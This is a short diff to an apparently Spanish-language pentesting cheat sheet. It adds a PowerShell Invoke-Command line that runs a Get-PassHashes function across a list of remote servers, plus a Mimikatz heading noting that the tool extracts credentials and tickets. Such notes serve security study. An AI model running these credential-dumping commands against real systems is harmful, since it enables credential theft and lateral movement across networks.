@@ -293,5 +293,8 @@ Invoke-Command -FilePath <ruta_scripts> -ComputerName (Get-Content .\servers.txt
 
 Ejecutar un comando que esta alojado en la maquina remota
 ```shell
-
+Invoke-Command -ScriptBlock ${function:Get-PassHashes} -ComputerName (Get-Content <list_of_servers>)
 ```
+
+#### Mimikatz
+Se puede usar para extraer credenciales, rickets, credenciales replay, etc....
